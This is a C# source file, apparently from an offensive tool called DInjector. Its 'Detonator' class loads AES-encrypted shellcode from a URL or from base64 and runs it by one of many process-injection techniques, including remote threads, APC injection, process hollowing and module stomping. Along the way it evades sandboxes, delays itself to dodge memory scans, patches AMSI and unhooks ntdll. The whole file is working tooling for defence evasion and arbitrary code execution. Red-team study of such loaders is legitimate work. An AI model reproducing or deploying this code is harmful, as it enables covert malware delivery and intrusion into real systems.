using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Diagnostics;
using System.Globalization;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace DInjector
{
    class Detonator
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocExNuma(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect,
            UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        private static extern void Sleep(uint dwMilliseconds);

        private static bool isPrime(int number)
        {
            bool calcPrime(int value)
            {
                var possibleFactors = Math.Sqrt(number);

                for (var factor = 2; factor <= possibleFactors; factor++)
                    if (value % factor == 0)
                        return false;

                return true;
            }

            return number > 1 && calcPrime(number);
        }

        static void Boom(string[] args)
        {
            // Check if we're in a sandbox by calling a rare-emulated API
            if (VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                Console.WriteLine("(VirtualAllocExNuma) [-] Failed check");
                return;
            }

            // Check if the emulator did not fast-forward through the sleep instruction
            var rand = new Random();
            uint dream = (uint)rand.Next(2000, 3000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                Console.WriteLine("(Sleep) [-] Failed check");
                return;
            }

            var options = ArgumentParser.Parse(args);

            // Sleep to evade in-memory scan
            try
            {
                int k = 0, sleep = int.Parse(options["/sleep"]);
                if (0 < sleep && sleep < 10)
                    k = 10;
                else if (10 <= sleep && sleep < 20)
                    k = 8;
                else if (20 <= sleep && sleep < 30)
                    k = 6;
                else if (30 <= sleep && sleep < 40)
                    k = 4;
                else if (40 <= sleep && sleep < 50)
                    k = 2;
                else if (50 <= sleep && sleep < 60 || 60 <= sleep)
                    k = 1;

                int start = 1, end = sleep * k * 100000;
                _ = Enumerable.Range(start, end - start).Where(isPrime).Select(number => number).ToList();
            }
            catch (Exception)
            { }

            // Bypass AMSI
            try
            {
                if (bool.Parse(options["/am51"]))
                    AM51.Patch();
            }
            catch (Exception)
            { }

            // Unhook ntdll.dll
            try
            {
                if (bool.Parse(options["/unhook"]))
                    Unhooker.Unhook();
            }
            catch (Exception)
            { }

            var commandName = string.Empty;
            foreach (KeyValuePair<string, string> item in options)
                if (item.Value == string.Empty)
                    commandName = item.Key;

            var shellcodePath = options["/sc"];
            var password = options["/password"];

            byte[] shellcodeEncrypted;
            if (shellcodePath.StartsWith("http", ignoreCase: true, culture: new CultureInfo("en-US")))
            {
                Console.WriteLine("(Detonator) [*] Loading shellcode from URL");
                WebClient wc = new WebClient();
                ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | (SecurityProtocolType)768 | (SecurityProtocolType)3072;
                MemoryStream ms = new MemoryStream(wc.DownloadData(shellcodePath));
                BinaryReader br = new BinaryReader(ms);
                shellcodeEncrypted = br.ReadBytes(Convert.ToInt32(ms.Length));
            }
            else
            {
                Console.WriteLine("(Detonator) [*] Loading shellcode from base64 input");
                shellcodeEncrypted = Convert.FromBase64String(shellcodePath);
            }

            AES ctx = new(password);
            var shellcodeBytes = ctx.Decrypt(shellcodeEncrypted);

            var ppid = 0;
            try
            {
                ppid = int.Parse(options["/ppid"]);
            }
            catch (Exception)
            { }

            var blockDlls = false;
            try
            {
                if (bool.Parse(options["/blockDlls"]))
                    blockDlls = true;
            }
            catch (Exception)
            { }

            switch (commandName.ToLower())
            {
                case "functionpointer":
                    FunctionPointer.Execute(shellcodeBytes);
                    break;
                case "functionpointerv2":
                    FunctionPointerV2.Execute(shellcodeBytes);
                    break;
                case "clipboardpointer":
                    ClipboardPointer.Execute(shellcodeBytes);
                    break;
                case "currentthread":
                    CurrentThread.Execute(shellcodeBytes);
                    break;
                case "currentthreaduuid":
                    string shellcodeUuids = System.Text.Encoding.UTF8.GetString(shellcodeBytes);
                    CurrentThreadUuid.Execute(shellcodeUuids);
                    break;
                case "remotethread":
                    RemoteThread.Execute(
                        shellcodeBytes,
                        int.Parse(options["/pid"]));
                    break;
                case "remotethreaddll":
                    RemoteThreadDll.Execute(
                        shellcodeBytes,
                        int.Parse(options["/pid"]),
                        options["/dll"]);
                    break;
                case "remotethreadview":
                    RemoteThreadView.Execute(
                        shellcodeBytes,
                        int.Parse(options["/pid"]));
                    break;
                case "remotethreadsuspended":
                    RemoteThreadSuspended.Execute(
                        shellcodeBytes,
                        int.Parse(options["/pid"]));
                    break;
                case "remotethreadkernelcb":
                    RemoteThreadKernelCB.Execute(
                        shellcodeBytes,
                        int.Parse(options["/pid"]));
                    break;
                case "remotethreadapc":
                    RemoteThreadAPC.Execute(
                        shellcodeBytes,
                        options["/image"],
                        ppid,
                        blockDlls);
                    break;
                case "remotethreadcontext":
                    RemoteThreadContext.Execute(
                        shellcodeBytes,
                        options["/image"],
                        ppid,
                        blockDlls);
                    break;
                case "processhollowing":
                    ProcessHollowing.Execute(
                        shellcodeBytes,
                        options["/image"],
                        ppid,
                        blockDlls);
                    break;
                case "modulestomping":
                    ModuleStomping.Execute(
                        shellcodeBytes,
                        options["/image"],
                        options["/stomp"],
                        options["/export"],
                        ppid,
                        blockDlls);
                    break;
            }
        }
    }
}
